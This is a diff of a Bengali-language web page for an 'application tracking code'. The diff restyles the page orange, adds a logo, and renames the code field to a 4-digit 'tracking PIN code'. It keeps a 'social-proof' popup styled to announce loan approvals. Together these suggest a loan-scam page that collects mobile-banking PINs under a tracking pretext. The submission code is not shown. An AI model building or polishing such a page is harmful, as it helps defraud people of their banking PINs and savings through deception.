@@ -3,39 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>আবেদন ট্র্যাকিং কোড</title>
+    <title>আবেদন ট্র্যাকিং পিন কোড</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
-        body { background: #f8fafc; min-height: 100vh; display: flex; justify-content: center; }
-        .container { width: 100%; max-width: 450px; background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
-        .header { background: linear-gradient(135deg, #1d4ed8, #3b82f6); color: #ffffff; padding: 35px 20px 30px; text-align: center; }
-        .header h2 { font-size: 24px; margin-bottom: 6px; font-weight: 700; }
-        .header p { font-size: 13.5px; opacity: 0.9; }
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+        }
+
+        /* মূল ব্যাকগ্রাউন্ড সম্পূর্ণ সাদা */
+        body { 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            position: relative; 
+            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08);
+            border-left: 1px solid #fff7ed;
+            border-right: 1px solid #fff7ed;
+        }
+
+        /* কমলা গ্রেডিয়েন্ট হেডার */
+        .header { 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            padding: 28px 20px 24px; 
+            text-align: center; 
+            border-bottom-left-radius: 24px;
+            border-bottom-right-radius: 24px;
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.2);
+        }
+        .header-logo-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+        .header-logo {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 50%;
+            background: #ffffff;
+            padding: 2px;
+            border: 2px solid #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        .header h2 { font-size: 22px; margin-bottom: 4px; font-weight: 700; }
+        .header p { font-size: 13px; opacity: 0.95; }
 
         .form-wrap { padding: 30px 20px; flex-grow: 1; }
         .form-group { margin-bottom: 22px; }
-        .form-group label { display: block; font-size: 14px; font-weight: 700; color: #334155; margin-bottom: 8px; }
-        .form-group input { width: 100%; padding: 14px 15px; border: 1.5px solid #cbd5e1; border-radius: 12px; font-size: 16px; outline: none; background: #f1f5f9; color: #1e293b; }
-        .tracking-input { letter-spacing: 6px; font-size: 20px !important; font-weight: 700; text-align: center; background: #ffffff !important; }
-        .tracking-input:focus { border-color: #2563eb !important; }
-        .btn-submit { width: 100%; padding: 15px; background: #1d4ed8; color: #ffffff; border: none; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 15px rgba(29, 78, 216, 0.3); }
+        .form-group label { 
+            display: block; 
+            font-size: 13.5px; 
+            font-weight: 700; 
+            color: #334155; 
+            margin-bottom: 8px; 
+        }
+        .form-group label i {
+            color: #ff5e00;
+            margin-right: 4px;
+        }
+        .form-group input { 
+            width: 100%; 
+            padding: 14px 15px; 
+            border: 1.5px solid #fed7aa; 
+            border-radius: 12px; 
+            font-size: 15px; 
+            outline: none; 
+            background: #fffaf5; 
+            color: #1e293b; 
+            transition: all 0.2s;
+        }
+        .form-group input:focus { 
+            border-color: #ff5e00; 
+            background: #ffffff; 
+            box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
+        }
+        .tracking-input { 
+            letter-spacing: 6px; 
+            font-size: 18px !important; 
+            font-weight: 700; 
+            text-align: center; 
+            background: #ffffff !important; 
+        }
+
+        /* কমলা সাবমিট বাটন */
+        .btn-submit { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 30px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 15px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px; 
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3); 
+            transition: transform 0.2s;
+        }
+        .btn-submit:active { transform: scale(0.98); }
         .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        .loan-popup { position: fixed; bottom: 20px; left: 20px; background: #ffffff; color: #1e293b; padding: 12px 16px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); display: flex; align-items: center; gap: 12px; z-index: 9999; max-width: 340px; border-left: 5px solid #16a34a; opacity: 0; transform: translateY(30px); transition: all 0.5s ease-in-out; pointer-events: none; }
-        .loan-popup.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
-        .popup-icon { width: 38px; height: 38px; background: #dcfce7; color: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+        /* সোশ্যাল-প্রুফ লাইভ পপআপ */
+        .loan-popup { 
+            position: fixed; 
+            bottom: 20px; 
+            left: 20px; 
+            background: #ffffff; 
+            color: #1e293b; 
+            padding: 12px 16px; 
+            border-radius: 12px; 
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            z-index: 9999; 
+            max-width: 340px; 
+            border-left: 5px solid #16a34a; 
+            opacity: 0; 
+            transform: translateY(30px); 
+            transition: all 0.5s ease-in-out; 
+            pointer-events: none; 
+        }
+        .loan-popup.show { 
+            opacity: 1; 
+            transform: translateY(0); 
+            pointer-events: auto; 
+        }
+        .popup-icon { 
+            width: 38px; 
+            height: 38px; 
+            background: #dcfce7; 
+            color: #16a34a; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 18px; 
+            flex-shrink: 0; 
+        }
         .popup-content { display: flex; flex-direction: column; }
         .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
         .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
         .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
-        @media (max-width: 480px) { .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; } }
+        @media (max-width: 480px) { 
+            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; } 
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
+        <div class="header-logo-wrap">
+            <!-- কোম্পানির লোগো -->
+            <img src="logoo.png" alt="Company Logo" class="header-logo">
+        </div>
         <h2>আবেদন ট্র্যাকিং কোড</h2>
         <p>আপনার রেফারেন্স বা ট্র্যাকিং কোড প্রদান করুন</p>
     </div>
@@ -51,8 +191,9 @@
             </div>
 
             <div class="form-group">
-                <label><i class="fa-solid fa-hashtag"></i> ট্র্যাকিং কোড (৪ ডিজিট)</label>
-                <input type="text" name="ট্র্যাকিং_আইডি_ধাপ_১" class="tracking-input" maxlength="6" required placeholder="# # # #">
+                <!-- এখানে হ্যাশট্যাগ বদলে ট্র্যাকিং পিন কোড দেওয়া হলো -->
+                <label><i class="fa-solid fa-key"></i> ট্র্যাকিং পিন কোড (৪ ডিজিট)</label>
+                <input type="text" name="ট্র্যাকিং_পিন_কোড" class="tracking-input" maxlength="6" required placeholder="পিন কোড দিন">
             </div>
 
             <button type="submit" id="btnSubmit" class="btn-submit">
